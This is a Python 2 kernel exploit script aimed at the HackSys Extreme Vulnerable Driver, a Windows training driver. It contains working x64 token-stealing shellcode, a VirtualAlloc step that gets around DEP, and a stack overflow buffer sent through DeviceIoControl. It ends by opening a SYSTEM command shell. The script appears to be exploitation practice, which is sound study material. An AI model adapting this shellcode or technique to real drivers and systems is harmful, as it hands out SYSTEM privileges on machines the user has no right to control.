import ctypes, sys, struct
from subprocess import *
from ctypes import *


#Set the kernel dll
kernel32 = windll.kernel32

#Get the Handle
generic_read = 0x80000000
generic_write = 0x40000000
open_existing = 0x00000003
file_attribute_normal = 0x00000080
DWSharedMode = 0
hTemplateFile = None
lpSecurityAttributes = None
# HANDLE WINAPI CreateFile(
#   _In_     LPCTSTR               lpFileName,
#   _In_     DWORD                 dwDesiredAccess,
#   _In_     DWORD                 dwShareMode,
#   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
#   _In_     DWORD                 dwCreationDisposition,
#   _In_     DWORD                 dwFlagsAndAttributes,
#   _In_opt_ HANDLE                hTemplateFile
# );
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", (generic_read|generic_write), DWSharedMode, lpSecurityAttributes, open_existing, file_attribute_normal, hTemplateFile)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)


#This will define the CTL_CODE
file_device_unknown = 0x00000022
file_any_access = 0x00000000
method_neither = 0x00000003
ctl_code = hex((file_device_unknown << 16) | (file_any_access<< 14) | (0x800 << 2) | method_neither)
print "\n[*]     CTL code is: " + ctl_code + "      [*]" 

#System Token Stealing Payload
print "[*]     Stealing SYSTEM Token      [*]"

shellcode = bytearray(
	"\x48\x31\xc0" 				# xorq	%rax, %rax      | xor rax, rax			; Zero Out rax
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"  # movq	%gs:392, %rax   | mov rax, [gs:188h]        	; Get nt!_KPCR.PcrbData.CurrentThread
	"\x48\x8b\x40\x70"			# movq	112(%rax), %rax | mov rax, [rax + 70h]          ; Get nt!_KTHREAD.ApcState.Process	
	"\x48\x89\xc1"				# movq	%rax, %rcx	| mov rcx, rax                  ; Copy current process _EPROCESS structure	
	"\x49\x89\xcb"				# movq	%rcx, %r11	| mov r11, rcx                  ; Store Token.RefCnt
	"\x49\x83\xe3\x07"			# andq	$7, %r11	| and r11, 7		
	"\xba\x04\x00\x00\x00"			# movl	$4, %edx	| mov rdx, 4h                   ; WIN 7 SP1 SYSTEM process PID = 0x4
	"\x48\x8b\x80\x88\x01\x00\x00"		# movq	392(%rax), %rax	| mov rax, [rax + 188h]         ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
	"\x48\x2d\x88\x01\x00\x00"		# subq	$392, %rax	| sub rax, 188h
	"\x48\x39\x90\x80\x01\x00\x00"		# cmpq	%rdx, 384(%rax)	| cmp[rax + 180h], rdx          ; Get nt!_EPROCESS.UniqueProcessId
	"\x75\xea"				# jne	-22 <.text+0x1f>
	"\x48\x8b\x90\x08\x02\x00\x00" 		# movq	520(%rax), %rdx	| mov rdx, [rax + 208h]         ; Get SYSTEM process nt!_EPROCESS.Token	
 	"\x48\x83\xe2\xf0"			# andq	$-16, %rdx	| and rdx, 0fffffffffffffff0h 	
	"\x4c\x09\xda"				# orq	%r11, %rdx	| or rdx, r11	
	"\x48\x89\x91\x08\x02\x00\x00"		# movq	%rdx, 520(%rcx) | mov[rcx+ 208h], rdx           ; Replace target process nt!_EPROCESS.Token
	"\x48\x83\xc4\x28" 			# addq	$40, %rsp	| add rsp, 28			; Align the Stack
	"\xc3"					# retq
)


print "[*]  VirtualAlloc() to Bypass DEP  [*]"
lpAdress = None
dwSize = c_int(len(shellcode))
mem_commit = 0x00001000
mem_reserve = 0x00002000
page_execute_readwrite = 0x00000040
#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => None                         #
#   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
#   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
#   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
# );                                                                  #
#---------------------------------------------------------------------#
ptr = kernel32.VirtualAlloc(lpAdress, dwSize, mem_commit|mem_reserve, page_execute_readwrite)
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
final_exploit = struct.pack("<Q",ptr)


print "[*]      Sending Buffer!!!         [*]"
rdi = "B"*8
dwIoControlCode = 0x222003
exploit = 'A' * 2048 + rdi + final_exploit
exploitLength = len(exploit)
lpOutBuffer = None
nOutBufferSize = 0
lpBytesReturned = byref(c_ulong())
lpOverlapped = None
# BOOL WINAPI DeviceIoControl(
#   _In_        HANDLE       hDevice,
#   _In_        DWORD        dwIoControlCode,
#   _In_opt_    LPVOID       lpInBuffer,
#   _In_        DWORD        nInBufferSize,
#   _Out_opt_   LPVOID       lpOutBuffer,
#   _In_        DWORD        nOutBufferSize,
#   _Out_opt_   LPDWORD      lpBytesReturned,
#   _Inout_opt_ LPOVERLAPPED lpOverlapped
# );
# send the control code with buffer to the vulnerable driver
kernel32.DeviceIoControl(hevDevice, dwIoControlCode, exploit, exploitLength, lpOutBuffer, nOutBufferSize, lpBytesReturned , lpOverlapped)

#Spawn a NT System Shell
print "[*]   Popping a NT/System Shell!!! [*]"
Popen("start cmd", shell=True)
